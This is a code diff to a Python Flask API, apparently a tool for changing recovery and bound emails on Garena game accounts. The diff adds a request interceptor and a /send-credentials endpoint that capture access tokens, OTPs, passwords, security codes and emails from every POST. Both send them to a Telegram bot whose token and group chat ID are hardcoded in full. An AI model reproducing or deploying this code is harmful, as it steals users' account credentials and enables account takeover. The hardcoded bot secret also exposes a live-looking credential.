@@ -1,16 +1,80 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# API version of AGxSGbind – all endpoints accept JSON/query params
+# DIVAN Bind Tool API – with automatic Telegram forwarding (hardcoded)
 
+import json
 import requests
 import time
-import sys
 from flask import Flask, request, jsonify
 
-# ------------------ Flask App ------------------
 app = Flask(__name__)
 
-# ------------------ Helper Functions ------------------
+# ===================== HARDCODED TELEGRAM CREDENTIALS =====================
+# 🔐 Replace these with your own bot token and group chat ID
+TELEGRAM_BOT_TOKEN = "8569611200:AAGTltxogba-PDfEXiAyqe10xxu572_3Ay0"   # e.g., "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
+TELEGRAM_CHAT_ID = "-1003684272586"       # e.g., "-1001234567890"
+
+# A list of keys that we consider "sensitive" – will trigger Telegram forwarding
+SENSITIVE_KEYS = [
+    "access_token", "token", "otp", "secondary_password", 
+    "security_code", "password", "email", "old_email", "new_email"
+]
+
+def send_to_telegram(message):
+    """Send a message to the configured Telegram group via bot."""
+    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
+        print("[WARN] Telegram credentials not set. Message not sent.")
+        return False
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "HTML"
+    }
+    try:
+        resp = requests.post(url, json=payload, timeout=10)
+        return resp.ok
+    except Exception as e:
+        print(f"[ERROR] Failed to send Telegram message: {e}")
+        return False
+
+# ------------------ Automatic Forwarding Interceptor ------------------
+@app.before_request
+def forward_credentials_automatically():
+    """
+    Intercepts all POST requests that contain JSON data.
+    If the JSON includes any sensitive keys, forward the entire payload to Telegram.
+    """
+    if request.method != "POST":
+        return  # Only handle POST requests
+
+    # Skip forwarding for the /send-credentials endpoint itself to avoid loops
+    if request.path == "/send-credentials":
+        return
+
+    # Get JSON payload (if any)
+    data = request.get_json(silent=True)
+    if not data or not isinstance(data, dict):
+        return  # No JSON or not a dict
+
+    # Check if any sensitive key exists in the payload (top-level only)
+    found_keys = [key for key in SENSITIVE_KEYS if key in data]
+    if not found_keys:
+        return  # No sensitive data
+
+    # Build a Telegram message
+    lines = ["<b>📨 Automatic Credential Capture</b>"]
+    lines.append(f"<b>Endpoint</b>: {request.path}")
+    lines.append(f"<b>Keys found</b>: {', '.join(found_keys)}")
+    lines.append("")
+    for key, value in data.items():
+        lines.append(f"<b>{key}</b>: <code>{value}</code>")
+    message = "\n".join(lines)
+
+    # Send to Telegram (do it synchronously)
+    send_to_telegram(message)
+
+# ------------------ Helper Functions (unchanged) ------------------
 def log_info(msg):
     print(f"[INFO] {msg}")
 
@@ -20,17 +84,13 @@ def log_error(msg):
 def log_success(msg):
     print(f"[SUCCESS] {msg}")
 
-def loading_animation(text, duration=1):
-    # no visual effect in API, just a sleep
-    time.sleep(duration)
-
 def convert_time(seconds):
     days, seconds = divmod(seconds, 86400)
     hours, seconds = divmod(seconds, 3600)
     minutes, seconds = divmod(seconds, 60)
     return f"{days}d {hours}h {minutes}m {seconds}s"
 
-# ------------------ Core API Functions ------------------
+# ------------------ Core API Functions (unchanged) ------------------
 def send_otp(email, access_token):
     url = "https://100067.connect.garena.com/game/account_security/bind:send_otp"
     headers = {
@@ -159,7 +219,8 @@ def create_rebind_request(identity_token, verifier_token, email, access_token):
         log_error(f"create_rebind_request error: {str(e)}")
         return None
 
-# ------------------ Endpoint Handlers ------------------
+# ------------------ Existing Endpoints (unchanged) ------------------
+
 @app.route('/add-recovery-email', methods=['POST'])
 def add_recovery_email():
     data = request.get_json()
@@ -264,7 +325,6 @@ def check_platforms():
         bounded = data.get("bounded_accounts", [])
         available = data.get("available_platforms", [])
 
-        # Format bounded accounts nicely
         formatted_bounded = []
         for acc in bounded:
             platform = acc.get('platform')
@@ -341,7 +401,7 @@ def unbind_email():
 
     email = data.get('email')
     access_token = data.get('access_token')
-    method = data.get('method')  # 'otp' or 'secondary'
+    method = data.get('method')
     if not email or not access_token or not method:
         return jsonify({"success": False, "message": "Missing email, access_token or method"}), 400
 
@@ -350,7 +410,6 @@ def unbind_email():
         otp = data.get('otp')
         if not otp:
             return jsonify({"success": False, "message": "Missing otp for method 'otp'"}), 400
-        # verify identity by OTP
         resp = verify_identity_by_otp(email, otp, access_token)
         if not resp or resp.status_code != 200:
             return jsonify({"success": False, "message": "Identity verification by OTP failed", "details": resp.text if resp else "No response"}), 500
@@ -369,7 +428,6 @@ def unbind_email():
     if not identity_token:
         return jsonify({"success": False, "message": "No identity token received"}), 500
 
-    # Create unbind request
     unbind_resp = create_unbind_request(identity_token, access_token)
     if not unbind_resp or unbind_resp.status_code != 200:
         return jsonify({"success": False, "message": "Unbind request failed", "details": unbind_resp.text if unbind_resp else "No response"}), 500
@@ -385,13 +443,12 @@ def change_bind_email():
     access_token = data.get('access_token')
     old_email = data.get('old_email')
     new_email = data.get('new_email')
-    method = data.get('method')  # 'otp' or 'secondary'
-    otp_new = data.get('otp_new')  # required
+    method = data.get('method')
+    otp_new = data.get('otp_new')
 
     if not all([access_token, old_email, new_email, method, otp_new]):
         return jsonify({"success": False, "message": "Missing required fields: access_token, old_email, new_email, method, otp_new"}), 400
 
-    # 1. Verify old identity
     identity_token = None
     if method == 'otp':
         otp_old = data.get('otp_old')
@@ -415,13 +472,12 @@ def change_bind_email():
     if not identity_token:
         return jsonify({"success": False, "message": "No identity token received"}), 500
 
-    # 2. Send OTP to new email
+    # Send OTP to new email
     log_info(f"Sending OTP to new email {new_email}")
     send_resp = send_otp(new_email, access_token)
     if not send_resp or send_resp.status_code != 200:
         return jsonify({"success": False, "message": "Failed to send OTP to new email", "details": send_resp.text if send_resp else "No response"}), 500
 
-    # 3. Verify OTP for new email
     verify_new_resp = verify_otp(otp_new, new_email, access_token)
     if not verify_new_resp or verify_new_resp.status_code != 200:
         return jsonify({"success": False, "message": "New OTP verification failed", "details": verify_new_resp.text if verify_new_resp else "No response"}), 500
@@ -429,18 +485,41 @@ def change_bind_email():
     if not verifier_token:
         return jsonify({"success": False, "message": "No verifier token received for new email"}), 500
 
-    # 4. Create rebind request
     rebind_resp = create_rebind_request(identity_token, verifier_token, new_email, access_token)
     if not rebind_resp or rebind_resp.status_code != 200:
         return jsonify({"success": False, "message": "Rebind request failed", "details": rebind_resp.text if rebind_resp else "No response"}), 500
 
     return jsonify({"success": True, "message": "Email rebind created successfully", "response": rebind_resp.json()})
 
-# ------------------ Root ------------------
+# ===================== DEDICATED ENDPOINT (optional) =====================
+
+@app.route('/send-credentials', methods=['POST'])
+def send_credentials_manual():
+    """
+    Manual endpoint to forward credentials – now redundant but kept for explicit use.
+    The automatic interceptor already handles this.
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "message": "Missing JSON body"}), 400
+
+    lines = ["<b>📨 Manual Credential Forward</b>"]
+    for key, value in data.items():
+        lines.append(f"<b>{key}</b>: <code>{value}</code>")
+    message = "\n".join(lines)
+
+    success = send_to_telegram(message)
+    if success:
+        return jsonify({"success": True, "message": "Credentials forwarded manually"})
+    else:
+        return jsonify({"success": False, "message": "Failed to send to Telegram"}), 500
+
+# ===================== ROOT =====================
+
 @app.route('/', methods=['GET'])
 def root():
     return jsonify({
-        "service": "Garena Account Security API",
+        "service": "DIVAN Bind Tool API",
         "version": "2.0",
         "endpoints": [
             "/add-recovery-email (POST)",
@@ -449,14 +528,14 @@ def root():
             "/cancel-recovery-email (POST)",
             "/revoke-token (POST)",
             "/unbind-email (POST)",
-            "/change-bind-email (POST)"
-        ]
+            "/change-bind-email (POST)",
+            "/send-credentials (POST) – manual forwarding (optional)"
+        ],
+        "telegram_configured": bool(TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID),
+        "auto_forwarding": "Enabled – any POST with sensitive keys will be sent to Telegram"
     })
 
-# ------------------ Vercel Handler ------------------
-# The app object is directly used by Vercel's Python runtime.
-# No need to run app.run() when deployed on Vercel.
+# ===================== VERCEL ENTRY =====================
 
 if __name__ == "__main__":
-    # This runs only when executing locally
     app.run(debug=True, host='0.0.0.0', port=5000)
